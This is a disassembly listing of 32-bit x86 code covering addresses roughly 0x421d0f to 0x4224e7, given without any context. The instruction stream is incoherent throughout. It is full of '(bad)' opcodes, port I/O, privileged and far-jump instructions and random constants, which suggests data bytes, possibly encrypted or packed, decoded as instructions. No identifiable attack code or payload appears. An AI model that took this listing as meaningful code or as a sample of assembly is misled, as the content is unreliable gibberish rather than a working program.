  421d0f:	test   DWORD PTR [eax-0x20976c30],edi
  421d15:	clc    
  421d16:	sbb    dl,BYTE PTR [esi-0x6f]
  421d19:	dec    eax
  421d1a:	jg     0x421cb0
  421d1c:	test   eax,0xa61f36bb
  421d21:	jb     0x421ced
  421d23:	sahf   
  421d24:	je     0x421d8d
  421d26:	cmp    al,0xf2
  421d28:	push   esi
  421d29:	xor    DWORD PTR [esp+eiz*4+0x33],ebp
  421d2d:	inc    ecx
  421d2e:	mov    al,ds:0xa9c47ab9
  421d33:	out    dx,eax
  421d34:	sub    ebp,DWORD PTR [eax-0x5fc605a2]
  421d3a:	mov    bl,0xd
  421d3c:	stos   DWORD PTR es:[edi],eax
  421d3d:	cmp    al,0x8e
  421d3f:	mov    al,0xbf
  421d41:	ds mov edi,0x7b7df4a6
  421d47:	xchg   BYTE PTR [esi+esi*8-0x7ebd54b1],bl
  421d4e:	repz push ecx
  421d50:	in     eax,dx
  421d51:	leave  
  421d52:	daa    
  421d53:	aas    
  421d54:	jnp    0x421d50
  421d56:	mov    cl,0x2b
  421d58:	pop    ecx
  421d59:	jmp    0x1ca82775
  421d5e:	xchg   ecx,eax
  421d5f:	push   ss
  421d60:	adc    al,dh
  421d62:	push   ebp
  421d63:	outs   dx,DWORD PTR ds:[esi]
  421d64:	mov    ebp,0x553699d9
  421d69:	pop    ebx
  421d6a:	sub    ecx,esp
  421d6c:	fimul  WORD PTR [edx+0x6b]
  421d6f:	pop    ebp
  421d70:	out    dx,eax
  421d71:	inc    esi
  421d72:	pop    esp
  421d73:	or     edx,DWORD PTR [esi+0x43]
  421d76:	sub    BYTE PTR ds:0x8e95f707,cl
  421d7c:	fild   WORD PTR [eax-0x33]
  421d7f:	and    al,0x17
  421d81:	jmp    0xe5bc:0xf7a533b7
  421d88:	push   esp
  421d89:	mov    ds:0x61759742,eax
  421d8e:	or     al,0x4b
  421d90:	push   eax
  421d91:	cld    
  421d92:	mov    ch,0xfc
  421d94:	xor    DWORD PTR [ebp-0x34],0x78
  421d98:	mov    ebx,0x894d86b1
  421d9d:	nop
  421d9e:	sbb    edi,DWORD PTR [ecx-0x1f]
  421da1:	xchg   BYTE PTR ds:0x34438922,cl
  421da7:	aam    0x9e
  421da9:	dec    ebx
  421daa:	push   ecx
  421dab:	xchg   ebx,eax
  421dac:	outs   dx,BYTE PTR ds:[esi]
  421dad:	push   ecx
  421dae:	dec    edx
  421daf:	mov    esi,0xffd8bfed
  421db4:	sub    dh,BYTE PTR ds:0xcd789581
  421dba:	jnp    0x421dfd
  421dbc:	stos   DWORD PTR es:[edi],eax
  421dbd:	call   0xffe6:0xc1dbd2ec
  421dc4:	push   esp
  421dc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dc6:	out    0xb6,al
  421dc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421dc9:	cs and al,0xe2
  421dcc:	mov    edx,ds
  421dce:	mov    ecx,0xa13e8b5e
  421dd3:	sti    
  421dd4:	add    eax,0xd7b96388
  421dd9:	adc    ecx,DWORD PTR [esi+0x0]
  421ddc:	mov    eax,ds:0x15d39ee6
  421de1:	inc    ecx
  421de2:	call   0x409:0x951501fc
  421de9:	hlt    
  421dea:	pop    ecx
  421deb:	ds xchg ebx,eax
  421ded:	sub    eax,0xd6658ab5
  421df2:	in     al,0x0
  421df4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421df5:	(bad)  
  421df6:	xchg   BYTE PTR ds:0x5fc09d1e,al
  421dfc:	jmp    0x421e2d
  421dfe:	cli    
  421dff:	ins    DWORD PTR es:[edi],dx
  421e00:	cmp    BYTE PTR [esi+0x5f],bh
  421e03:	xchg   BYTE PTR [ecx+edx*4-0x21],dl
  421e07:	(bad)  
  421e08:	std    
  421e09:	pop    esp
  421e0a:	ins    BYTE PTR es:[edi],dx
  421e0b:	ret    
  421e0c:	jno    0x421e51
  421e0e:	jle    0x421df3
  421e10:	sbb    al,0xe1
  421e12:	je     0x421e76
  421e14:	cmp    cl,bh
  421e16:	mov    cl,0x6
  421e18:	dec    ebx
  421e19:	mov    al,0xb9
  421e1b:	pop    ebp
  421e1c:	inc    DWORD PTR [edi-0x1eded024]
  421e22:	mov    WORD PTR [edi-0x70dab90a],fs
  421e28:	push   0x7
  421e2a:	xor    BYTE PTR [ebp+0x11],ch
  421e2d:	xor    eax,0xab25abcd
  421e32:	call   0xf71292cf
  421e37:	aam    0x74
  421e39:	and    eax,0xe8c2d011
  421e3e:	adc    BYTE PTR [edi-0x5a],ah
  421e41:	xor    DWORD PTR [edi+0x5b6de4d],esi
  421e47:	jb     0x421e95
  421e49:	in     al,0x6d
  421e4b:	mov    al,0x1c
  421e4d:	push   esi
  421e4e:	test   DWORD PTR [esp+ebp*2-0x62addff7],0xa7bf09c8
  421e59:	(bad)  
  421e5b:	(bad)  
  421e5c:	mov    dh,0x9f
  421e5e:	pop    ebx
  421e5f:	add    DWORD PTR [edi+0x38],0x4c
  421e63:	xchg   ecx,eax
  421e64:	leave  
  421e65:	pop    ebp
  421e66:	stos   DWORD PTR es:[edi],eax
  421e67:	hlt    
  421e68:	jae    0x421e53
  421e6a:	sar    BYTE PTR [ebx-0x5],0x1
  421e6e:	push   ecx
  421e6f:	fs icebp 
  421e71:	jl     0x421e18
  421e73:	int3   
  421e74:	stc    
  421e75:	out    dx,al
  421e76:	out    dx,al
  421e77:	test   al,0x5
  421e79:	pop    esi
  421e7a:	fmul   DWORD PTR [ecx+0x42ae86b9]
  421e80:	xchg   ebp,eax
  421e81:	in     eax,0x87
  421e83:	add    edi,DWORD PTR [esi]
  421e85:	ds sti 
  421e87:	lds    eax,FWORD PTR [eax+0x7ba93cf3]
  421e8d:	lds    esi,FWORD PTR [esi]
  421e8f:	lock imul edi
  421e92:	sub    BYTE PTR ds:0x646dc579,ah
  421e98:	adc    eax,DWORD PTR [eax+ebx*4+0x41cbe7dc]
  421e9f:	push   DWORD PTR [esi-0x41]
  421ea2:	sub    al,0x2f
  421ea4:	xor    dl,BYTE PTR [edx+0x64edc384]
  421eaa:	addr16 ss mov bh,0x54
  421eae:	div    BYTE PTR [esp+ebp*1+0x23a57db]
  421eb5:	ds (bad) 
  421eb7:	mov    ds:0x672d0cc4,eax
  421ebc:	adc    al,0x36
  421ebe:	xchg   ebx,eax
  421ebf:	lahf   
  421ec0:	nop
  421ec1:	add    edx,DWORD PTR [ebp+0x603478b7]
  421ec7:	aaa    
  421ec8:	cwde   
  421ec9:	sub    edi,DWORD PTR [ebp+ecx*2+0x6cdffdf4]
  421ed0:	mov    bl,0xb7
  421ed2:	cdq    
  421ed3:	dec    ecx
  421ed4:	and    dl,BYTE PTR [esi+ecx*2]
  421ed7:	push   eax
  421ed8:	call   0x20e6:0x60e4d072
  421edf:	jl     0x421ef2
  421ee1:	into   
  421ee2:	hlt    
  421ee3:	repnz cwde 
  421ee5:	shr    DWORD PTR [eax-0x5746d7cd],cl
  421eeb:	add    al,0x4e
  421eed:	mov    bl,0x94
  421eef:	ins    BYTE PTR es:[edi],dx
  421ef0:	cmp    eax,0xb48e5e47
  421ef5:	push   ds
  421ef6:	xchg   edx,ebp
  421ef8:	in     eax,0xb0
  421efa:	lahf   
  421efb:	fs iret 
  421efd:	add    BYTE PTR [ebx+0x70],0x8f
  421f01:	js     0x421e85
  421f03:	push   edx
  421f04:	xchg   DWORD PTR [ecx],ebp
  421f06:	cmc    
  421f07:	mov    esp,0xcaf80b75
  421f0c:	loop   0x421ed1
  421f0e:	mov    ds:0xbf0b9017,al
  421f13:	push   ds
  421f14:	mov    bh,0x8c
  421f16:	(bad)
  421f1a:	in     al,dx
  421f1b:	xchg   edx,eax
  421f1c:	ins    BYTE PTR es:[edi],dx
  421f1d:	push   cs
  421f1e:	es scas eax,DWORD PTR es:[edi]
  421f20:	add    BYTE PTR [edx+0x24ad0ee9],bh
  421f26:	cwde   
  421f27:	mov    ch,0x9e
  421f29:	les    ebp,FWORD PTR [eax+0x64]
  421f2c:	inc    edx
  421f2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f2e:	cs cs hlt 
  421f31:	xor    BYTE PTR [esi+0x4f],cl
  421f34:	imul   esp,DWORD PTR [edi-0x74],0xffffff9d
  421f38:	lahf   
  421f39:	inc    eax
  421f3a:	jbe    0x421f7b
  421f3c:	pop    ds
  421f3d:	jmp    0xd0f9:0x97afe106
  421f44:	enter  0x73d5,0xca
  421f48:	push   ss
  421f49:	mov    ecx,0x32465206
  421f4e:	stc    
  421f4f:	mov    esp,0x663fc216
  421f54:	out    0xf7,al
  421f56:	jmp    0x421f89
  421f58:	fidivr WORD PTR [edx+eax*2+0x371b051b]
  421f5f:	scas   eax,DWORD PTR es:[edi]
  421f60:	add    ebx,DWORD PTR [ecx]
  421f62:	and    BYTE PTR [ebp+0x72],al
  421f65:	cmc    
  421f66:	mov    WORD PTR [ecx],es
  421f68:	in     eax,0xb3
  421f6a:	dec    edi
  421f6b:	lods   eax,DWORD PTR ds:[esi]
  421f6c:	popa   
  421f6d:	das    
  421f6e:	cmp    al,0xc4
  421f70:	push   edx
  421f71:	push   eax
  421f72:	sahf   
  421f73:	pop    es
  421f74:	(bad)  
  421f75:	jnp    0x421f2f
  421f77:	push   edx
  421f78:	sbb    eax,0x5cc6a641
  421f7d:	xchg   esi,eax
  421f7e:	out    dx,al
  421f7f:	pop    es
  421f80:	int3   
  421f81:	pushf  
  421f82:	and    al,0x57
  421f84:	xor    al,0x98
  421f86:	mov    esp,0xa3cf5634
  421f8b:	xchg   edx,eax
  421f8c:	mov    esp,0x62148aac
  421f91:	push   ebp
  421f92:	add    bl,BYTE PTR [ebp-0x60]
  421f95:	jno    0x421f45
  421f97:	jge    0x421fab
  421f99:	mov    ds:0xf35dfc58,al
  421f9e:	add    ecx,DWORD PTR cs:[edx-0x51]
  421fa2:	into   
  421fa3:	dec    esp
  421fa4:	lds    eax,FWORD PTR [edi+eiz*4-0x46]
  421fa8:	push   eax
  421fa9:	loopne 0x422000
  421fab:	and    dl,ah
  421fad:	retf   0xb579
  421fb0:	adc    eax,0xbd5a4cd3
  421fb5:	clc    
  421fb6:	push   eax
  421fb7:	aaa    
  421fb8:	ja     0x422003
  421fba:	nop
  421fbb:	dec    edi
  421fbc:	cmc    
  421fbd:	pop    DWORD PTR [edx]
  421fbf:	or     ch,BYTE PTR [ecx]
  421fc1:	and    BYTE PTR [edi+0x37c930f8],0xfa
  421fc8:	cli    
  421fc9:	pop    ds
  421fca:	inc    ebp
  421fcb:	ins    BYTE PTR es:[edi],dx
  421fcc:	inc    ebx
  421fcd:	jns    0x421f95
  421fcf:	leave  
  421fd0:	add    al,BYTE PTR [edi]
  421fd2:	sub    BYTE PTR [edi+0x75f43b8a],ah
  421fd8:	das    
  421fd9:	daa    
  421fda:	mov    dh,0xbb
  421fdc:	xor    DWORD PTR [eax],esi
  421fde:	sbb    DWORD PTR [edi+0x79],edi
  421fe1:	mov    cl,BYTE PTR [ebp-0x5a]
  421fe4:	leave  
  421fe5:	pop    esp
  421fe6:	or     eax,0xf8dfa6ab
  421feb:	test   eax,0x22a43f19
  421ff0:	adc    BYTE PTR es:0xdd04207b,dh
  421ff7:	push   eax
  421ff8:	shl    BYTE PTR [edx-0x32],0xa2
  421ffc:	and    DWORD PTR [edx],ecx
  421ffe:	mov    WORD PTR [ecx+0x55a8c51c],?
  422004:	sbb    al,0x6f
  422006:	dec    ecx
  422007:	cmp    al,0x37
  422009:	jmp    0xbba3d85e
  42200e:	(bad)  
  42200f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422010:	ins    BYTE PTR es:[edi],dx
  422011:	aad    0x5d
  422013:	test   eax,0x6dc52d83
  422018:	stos   DWORD PTR es:[edi],eax
  422019:	push   esi
  42201a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42201b:	dec    edx
  42201c:	jmp    FWORD PTR [edi-0x6c966a86]
  422022:	sub    bl,dh
  422024:	je     0x42208f
  422026:	ins    BYTE PTR es:[edi],dx
  422027:	ret    0xcff1
  42202a:	aas    
  42202b:	je     0x421fea
  42202d:	aam    0xf0
  42202f:	jmp    0x421fe2
  422031:	pop    ecx
  422032:	inc    edi
  422033:	inc    ecx
  422034:	(bad)  
  422035:	call   0xf5289ea4
  42203a:	retf   
  42203b:	mov    ebp,0x6a1469e5
  422040:	pop    ecx
  422041:	repz and eax,0x90f2bce3
  422047:	push   0x1a8eabad
  42204c:	mov    esi,0x8e421a7b
  422051:	out    0x14,al
  422053:	das    
  422054:	dec    ecx
  422055:	(bad)  
  422056:	fxch   st(4)
  422058:	in     eax,0x76
  42205a:	add    cl,BYTE PTR [ecx]
  42205c:	xor    DWORD PTR [eax+0x664cfeff],eax
  422062:	adc    DWORD PTR [ecx],0xffffffcb
  422065:	aam    0x43
  422067:	add    dh,BYTE PTR [ecx-0x2447948f]
  42206d:	jmp    0x3f37c483
  422072:	loopne 0x4220a0
  422074:	aaa    
  422075:	sbb    eax,edx
  422077:	or     esp,DWORD PTR [ebx]
  422079:	hlt    
  42207a:	shl    BYTE PTR [ecx-0x50],cl
  42207d:	dec    esp
  42207e:	call   DWORD PTR [esp+ecx*1]
  422081:	cmc    
  422082:	adc    eax,0x27cbdece
  422087:	dec    edx
  422088:	sbb    al,0xd0
  42208a:	sub    edi,esp
  42208c:	fs inc edx
  42208e:	mov    al,ds:0xe1d12b30
  422093:	adc    dl,bl
  422095:	mov    ebp,0xe9746f41
  42209a:	adc    ah,ah
  42209c:	retf   
  42209d:	mov    dl,0xae
  42209f:	dec    edi
  4220a0:	inc    esp
  4220a1:	popa   
  4220a2:	nop
  4220a3:	mov    esi,0x7422bb6e
  4220a8:	mov    eax,ds:0x741b15a4
  4220ad:	(bad)  
  4220ae:	std    
  4220af:	test   ax,0x4647
  4220b3:	ror    cl,1
  4220b5:	add    al,0x25
  4220b7:	test   al,0x6b
  4220b9:	into   
  4220ba:	mul    BYTE PTR [ebp-0x62c0be1d]
  4220c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220c1:	mov    edi,0xcfca5afe
  4220c6:	in     eax,0x8e
  4220c8:	sbb    DWORD PTR [edi-0x65f3a399],ebx
  4220ce:	int3   
  4220cf:	xchg   edx,eax
  4220d0:	out    0xa8,eax
  4220d2:	lock pop ecx
  4220d4:	mov    esi,0xf379b3e3
  4220d9:	inc    esp
  4220da:	test   BYTE PTR [edi+0x69],ah
  4220dd:	sar    BYTE PTR [edi],cl
  4220df:	and    eax,0x7f715a0b
  4220e4:	pushf  
  4220e5:	adc    BYTE PTR [edx+ebp*2+0x47232b57],al
  4220ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220ed:	inc    esi
  4220ee:	xchg   edi,eax
  4220ef:	jae    0x42216d
  4220f1:	push   edx
  4220f2:	ret    
  4220f3:	data16 cli 
  4220f5:	jle    0x422089
  4220f7:	and    eax,0x363f530c
  4220fc:	jmp    0x954a:0x9ef03ad
  422103:	stc    
  422104:	cs into 
  422106:	repz cs mov ebx,0x5ac88617
  42210d:	add    al,0xd3
  42210f:	add    dh,BYTE PTR [ecx-0x222cb71c]
  422115:	aas    
  422116:	xchg   al,dh
  422118:	pop    edi
  422119:	stc    
  42211a:	mov    bl,0xf2
  42211c:	adc    BYTE PTR ds:0x5220d128,bh
  422122:	lods   eax,DWORD PTR ds:[esi]
  422123:	sub    al,0x64
  422125:	adc    edi,esp
  422127:	mov    esp,esi
  422129:	mov    esi,esp
  42212b:	int    0xf5
  42212d:	mov    dl,0x8b
  42212f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422130:	retf   
  422131:	xchg   ebp,eax
  422132:	enter  0x2518,0xbb
  422136:	push   ebp
  422137:	mov    DWORD PTR [eax*8+0x1e6f7419],ebp
  42213e:	xchg   BYTE PTR [eiz*2+0xf2cdbbd],bl
  422145:	inc    ebx
  422146:	xlat   BYTE PTR ds:[ebx]
  422147:	repz lahf 
  422149:	sbb    eax,0x3bb57977
  42214e:	mov    esp,0x27554eb7
  422153:	jne    0x422116
  422155:	push   0xffffffa8
  422157:	jns    0x422117
  422159:	out    0x3d,eax
  42215b:	pop    ds
  42215c:	xlat   BYTE PTR ds:[ebx]
  42215d:	loope  0x4221c7
  42215f:	(bad)  
  422160:	aam    0x1d
  422162:	push   ebp
  422163:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422164:	jb     0x422100
  422166:	push   0xa8f01d2d
  42216b:	mov    ds,WORD PTR [edi]
  42216d:	xchg   edx,eax
  42216e:	sub    eax,0x9ccf9438
  422173:	mov    bh,0xb
  422175:	push   ebp
  422176:	and    BYTE PTR [edi+0x321d3443],0x4d
  42217d:	jge    0x422128
  42217f:	(bad)  
  422180:	push   edx
  422181:	push   0xfca8d1ed
  422186:	lods   al,BYTE PTR ds:[esi]
  422187:	mov    ch,0x61
  422189:	rcl    DWORD PTR [esi+0x1f],1
  42218c:	sub    BYTE PTR [eax],dh
  42218e:	cdq    
  42218f:	pop    ebp
  422190:	dec    ecx
  422191:	jmp    0xa7679efa
  422196:	push   edi
  422197:	out    0xc9,al
  422199:	jmp    0x4221ec
  42219b:	imul   edx,DWORD PTR [ecx+0x7acc0a05],0xf0058deb
  4221a5:	jne    0x42219f
  4221a7:	sbb    BYTE PTR [eax],0x78
  4221aa:	sbb    al,BYTE PTR [edx+eiz*8+0xa58dc5a]
  4221b1:	or     eax,0xef7e10a3
  4221b6:	or     BYTE PTR [esi+0x23a49a51],ch
  4221bc:	xor    BYTE PTR [ebx],ch
  4221be:	push   es
  4221bf:	cdq    
  4221c0:	xchg   esi,eax
  4221c1:	inc    edi
  4221c2:	add    BYTE PTR [eax+edx*2-0x316fae51],0x93
  4221ca:	icebp  
  4221cb:	ins    DWORD PTR es:[edi],dx
  4221cc:	icebp  
  4221cd:	cs mov dh,0x0
  4221d0:	pop    esp
  4221d1:	ins    BYTE PTR es:[edi],dx
  4221d2:	and    ch,BYTE PTR [edi+0x7b]
  4221d5:	mov    ecx,0xf736b6
  4221da:	and    ebp,DWORD PTR [edx+0x7f]
  4221dd:	hlt    
  4221de:	loopne 0x422245
  4221e0:	(bad)  
  4221e1:	into   
  4221e2:	fmul   DWORD PTR [edi-0x15ca26a7]
  4221e8:	sbb    dl,BYTE PTR [esp+eax*1-0x1f]
  4221ec:	or     al,0xf6
  4221ee:	out    0xcf,eax
  4221f0:	mov    al,0xe2
  4221f2:	sbb    BYTE PTR [edx-0x1432ed20],bh
  4221f8:	aaa    
  4221f9:	push   ds
  4221fa:	lea    esp,[ebx-0x2d]
  4221fd:	jno    0x4221f8
  4221ff:	(bad)  
  422200:	fdiv   QWORD PTR [ebp-0x4a]
  422203:	bound  ebx,QWORD PTR [eax]
  422205:	imul   ebp,DWORD PTR [edx],0xdf7d3e9
  42220b:	mov    al,0x7e
  42220d:	mov    ecx,0xbb391137
  422212:	xchg   esp,eax
  422213:	lea    edx,[ebx-0x6834ed1b]
  422219:	xchg   DWORD PTR [ebx],esi
  42221b:	(bad)  
  42221c:	lahf   
  42221d:	nop
  42221e:	ds jl  0x4221ec
  422221:	imul   ah
  422223:	je     0x42224e
  422225:	sbb    BYTE PTR [eax-0x3b],bl
  422228:	sub    bl,BYTE PTR [esi-0x14246ace]
  42222e:	push   ds
  42222f:	and    BYTE PTR cs:[edx+ebx*1-0x437a0ddb],ah
  422237:	adc    esi,esi
  422239:	sar    DWORD PTR [ebx+ecx*2+0x6d],cl
  42223d:	adc    ebp,DWORD PTR [eax+eiz*1]
  422240:	jmp    0x1785df1b
  422245:	daa    
  422246:	pop    esp
  422247:	adc    al,0x29
  422249:	pop    esi
  42224a:	mov    DWORD PTR [edi-0x56],edx
  42224d:	pop    ebx
  42224e:	push   edx
  42224f:	push   0x7936476e
  422254:	loop   0x4222a8
  422256:	mov    esp,0xfefad1e6
  42225b:	cmc    
  42225c:	out    dx,al
  42225d:	add    cl,BYTE PTR [esp+eax*4]
  422260:	xor    DWORD PTR [edx+edx*8],0x23
  422264:	test   al,0xb9
  422266:	xor    ecx,0xffffffee
  422269:	ja     0x42221e
  42226b:	int3   
  42226c:	inc    ebp
  42226d:	dec    eax
  42226e:	jmp    0x42223d
  422270:	dec    ebx
  422271:	jle    0x42229d
  422273:	adc    al,0xf6
  422275:	and    cl,BYTE PTR [esi-0x68]
  422278:	inc    esp
  422279:	imul   edx,esi,0xaa502678
  42227f:	and    eax,DWORD PTR [edi-0x5e7ee434]
  422285:	js     0x4222b8
  422287:	fisubr DWORD PTR ds:0x73d35617
  42228d:	addr16 hlt 
  42228f:	int3   
  422290:	outs   dx,DWORD PTR ds:[esi]
  422291:	mov    esi,0xed225d5b
  422296:	add    DWORD PTR [ecx+eiz*1],eax
  422299:	mov    ecx,0x7bf0e295
  42229e:	ds push eax
  4222a0:	pop    edi
  4222a1:	and    eax,0xb92917de
  4222a6:	pusha  
  4222a7:	cmp    edx,ebp
  4222a9:	mov    dl,0x9a
  4222ab:	fcmovnu st,st(7)
  4222ad:	xchg   ebp,eax
  4222ae:	sub    esi,ebp
  4222b0:	fisubr WORD PTR [esp+ecx*4+0x72]
  4222b4:	cli    
  4222b5:	dec    eax
  4222b6:	dec    esp
  4222b7:	xchg   edi,eax
  4222b8:	and    al,0xfe
  4222ba:	dec    esp
  4222bb:	jp     0x422300
  4222bd:	cmp    BYTE PTR [ebx-0x61],bh
  4222c0:	mov    BYTE PTR [edx+0x146d32bd],al
  4222c6:	jmp    0x7042161a
  4222cb:	mov    ds:0xca747c43,al
  4222d0:	icebp  
  4222d1:	dec    esi
  4222d2:	mov    ax,0x8ad8
  4222d6:	and    BYTE PTR [edi+0x449bbcea],0x6b
  4222dd:	adc    DWORD PTR [edx-0x50],ebx
  4222e0:	and    esp,DWORD PTR [esi-0x18eb2891]
  4222e6:	jbe    0x4222d2
  4222e8:	push   esi
  4222e9:	mov    ch,0x80
  4222eb:	pop    es
  4222ec:	add    eax,0x5cf82c2a
  4222f1:	xchg   ebx,eax
  4222f2:	dec    edx
  4222f3:	fbld   TBYTE PTR [eax-0x691ccb51]
  4222f9:	out    0xc3,eax
  4222fb:	push   es
  4222fc:	loope  0x4222ec
  4222fe:	mov    DWORD PTR [eax+esi*2+0x15],eax
  422302:	or     bh,al
  422304:	inc    esp
  422305:	sub    al,0xe8
  422307:	jmp    0x549d:0x5353008d
  42230e:	push   0x59e5df23
  422313:	jge    0x422355
  422315:	js     0x422377
  422317:	push   esi
  422318:	dec    ecx
  422319:	push   ss
  42231a:	(bad)  
  42231b:	push   0xd
  42231d:	jns    0x42238d
  42231f:	add    BYTE PTR [ebp-0x13ba46f3],dh
  422325:	dec    eax
  422326:	jp     0x42236c
  422328:	or     DWORD PTR [esp+edi*2+0x57],esi
  42232c:	sbb    bh,BYTE PTR [ebx+0x33]
  42232f:	mov    bl,0xe1
  422331:	test   eax,0xe7cc942c
  422336:	mov    es,WORD PTR [ecx-0x657218cf]
  42233c:	repnz imul eax,DWORD PTR [eax],0x42fb2e65
  422343:	mov    bh,0xc9
  422345:	repz scas al,BYTE PTR es:[edi]
  422347:	adc    eax,DWORD PTR [esi+0x37]
  42234a:	mov    ch,0x1b
  42234c:	addr16 jb 0x422376
  42234f:	push   ebp
  422350:	adc    dl,ch
  422352:	jl     0x4222ff
  422354:	je     0x422302
  422356:	mov    al,0x16
  422358:	mov    cl,BYTE PTR [ebp-0x2c]
  42235b:	cwde   
  42235c:	jne    0x4223b4
  42235e:	adc    DWORD PTR [esi],ebx
  422360:	(bad)  
  422361:	shl    DWORD PTR [esp+ebp*2+0x41],cl
  422365:	push   ss
  422366:	add    bl,BYTE PTR [eax]
  422368:	or     WORD PTR [edi+edi*1],si
  42236c:	sbb    DWORD PTR [edx+0x8],esp
  42236f:	nop
  422370:	dec    edx
  422371:	mov    al,0x72
  422373:	pusha  
  422374:	push   edi
  422375:	add    al,0xeb
  422377:	sbb    ebp,DWORD PTR [ecx+0x26]
  42237a:	adc    DWORD PTR ds:[ebp-0x2a],0x23
  42237f:	mov    ds:0xf0ddc9f6,al
  422384:	out    0x73,eax
  422386:	stos   BYTE PTR es:[edi],al
  422387:	(bad)  
  422388:	fisttp DWORD PTR [edi-0x65]
  42238b:	push   esi
  42238c:	mov    esi,0xffedc1c8
  422391:	test   BYTE PTR ds:0x51a91b89,0x44
  422398:	jle    0x422385
  42239a:	jmp    0xef3f223a
  42239f:	mov    ch,0xde
  4223a1:	sbb    DWORD PTR [esi],eax
  4223a3:	shl    DWORD PTR [ecx+0x7580d7c],1
  4223a9:	addr16 dec eax
  4223ab:	sahf   
  4223ac:	mov    dh,BYTE PTR [edx-0x4]
  4223af:	lds    edi,FWORD PTR [ebx+0x1af46a86]
  4223b5:	rol    edx,cl
  4223b7:	push   esp
  4223b8:	sub    DWORD PTR [edi],edx
  4223ba:	push   cs
  4223bb:	div    BYTE PTR [eax+eax*8-0x1d]
  4223bf:	sub    edx,edx
  4223c1:	scas   al,BYTE PTR es:[edi]
  4223c2:	adc    DWORD PTR [eax-0x4e],ebp
  4223c5:	out    0x22,al
  4223c7:	inc    edx
  4223c8:	lock xlat BYTE PTR cs:[ebx]
  4223cb:	mov    ds:0x8dacfa37,al
  4223d0:	or     al,0xb6
  4223d2:	icebp  
  4223d3:	mov    al,ds:0xad6d26ae
  4223d8:	mov    BYTE PTR [ebp+0x4e0475b2],ah
  4223de:	sub    dh,0x8
  4223e1:	clc    
  4223e2:	cs xchg ebx,eax
  4223e4:	mov    ds:0xf824bf4a,eax
  4223e9:	mov    DWORD PTR [edx-0x54],ebx
  4223ec:	cmp    al,BYTE PTR [edi-0x7bab1c23]
  4223f2:	pusha  
  4223f3:	xor    ch,al
  4223f5:	stos   BYTE PTR es:[edi],al
  4223f6:	adc    ebx,ebp
  4223f8:	outs   dx,DWORD PTR ds:[esi]
  4223f9:	pop    esp
  4223fa:	sbb    al,BYTE PTR [esp+ecx*8]
  4223fd:	mov    DWORD PTR [ecx+0x69],ebp
  422400:	std    
  422401:	mov    esp,esp
  422403:	fisub  DWORD PTR [edi-0x62952259]
  422409:	aad    0xa
  42240b:	lahf   
  42240c:	cmp    eax,0xd6b3f87b
  422411:	dec    ecx
  422412:	sub    DWORD PTR [ebx-0x794e34c8],edi
  422418:	or     eax,0x85be2b50
  42241d:	imul   edx,DWORD PTR [ebp-0x59],0xffffff8e
  422421:	inc    ecx
  422422:	mov    eax,0xd61b62d9
  422427:	loope  0x4223b9
  422429:	jno    0x422495
  42242b:	lahf   
  42242c:	sbb    eax,0x91f0dc2a
  422431:	ins    BYTE PTR es:[edi],dx
  422432:	(bad)  
  422433:	call   0x7e2716ab
  422438:	pushf  
  422439:	clc    
  42243a:	shr    DWORD PTR [ebx+0x1f],0x5c
  42243e:	repz cs cwde 
  422441:	cmp    DWORD PTR [edi+0x78932f10],eax
  422447:	cld    
  422448:	idiv   esi
  42244a:	or     ecx,DWORD PTR [ebx-0x59]
  42244d:	(bad)  
  42244e:	pushf  
  42244f:	loope  0x4224c4
  422451:	icebp  
  422452:	mov    bl,0xce
  422454:	sbb    edx,DWORD PTR [ebx+esi*8]
  422457:	scas   eax,DWORD PTR es:[edi]
  422458:	pushf  
  422459:	add    ah,BYTE PTR [edi+edi*4+0x12]
  42245d:	pop    edx
  42245e:	adc    eax,0x53bddb98
  422463:	cmp    BYTE PTR [ebp+eiz*4-0x31e347f],ch
  42246a:	aam    0xd3
  42246c:	cmc    
  42246d:	and    cl,BYTE PTR [ebx]
  42246f:	stos   DWORD PTR es:[edi],eax
  422470:	mov    cl,0x25
  422472:	gs idiv esi
  422475:	(bad)  [ebp-0x7792c638]
  42247b:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  42247d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42247e:	js     0x422490
  422480:	outs   dx,DWORD PTR ds:[esi]
  422481:	mov    esp,0x33ab8126
  422486:	dec    ecx
  422487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422488:	sahf   
  422489:	sbb    al,0x53
  42248b:	mov    ecx,DWORD PTR [ecx+0x18]
  42248e:	arpl   WORD PTR [ecx],di
  422490:	in     eax,dx
  422491:	lods   eax,DWORD PTR ds:[esi]
  422492:	enter  0xc777,0xb3
  422496:	xchg   BYTE PTR [ebp-0x2733d4ba],al
  42249c:	jb     0x42251d
  42249e:	or     BYTE PTR [edx+ebx*1-0x6b],dh
  4224a2:	in     eax,dx
  4224a3:	sub    eax,DWORD PTR [edx]
  4224a5:	jae    0x422475
  4224a7:	loop   0x422459
  4224a9:	and    al,0x1
  4224ab:	jp     0x4224e2
  4224ad:	xchg   BYTE PTR [ebp-0x21],dh
  4224b0:	shr    BYTE PTR [edi+0x5175f54f],1
  4224b6:	add    ebp,DWORD PTR [ebx+0x35c74323]
  4224bc:	inc    eax
  4224bd:	xchg   esi,eax
  4224be:	sahf   
  4224bf:	ds daa 
  4224c1:	mov    esp,0x6ebcd0a2
  4224c6:	or     al,0xf
  4224c8:	mov    dl,0xbd
  4224ca:	pusha  
  4224cb:	bound  esi,QWORD PTR [edx-0x37]
  4224ce:	mov    cs,WORD PTR [ecx]
  4224d0:	xchg   esi,eax
  4224d1:	add    DWORD PTR [eax],ebp
  4224d3:	mov    al,0x53
  4224d5:	sub    ecx,DWORD PTR [edx+0x21]
  4224d8:	xchg   esi,eax
  4224d9:	(bad)  
  4224da:	or     eax,DWORD PTR [edi+0x5b7e59af]
  4224e0:	jge    0x422519
  4224e2:	outs   dx,DWORD PTR ds:[esi]
  4224e3:	loop   0x42255e
  4224e5:	out    0x61,eax
  4224e7:	repz mov ch,0x8f
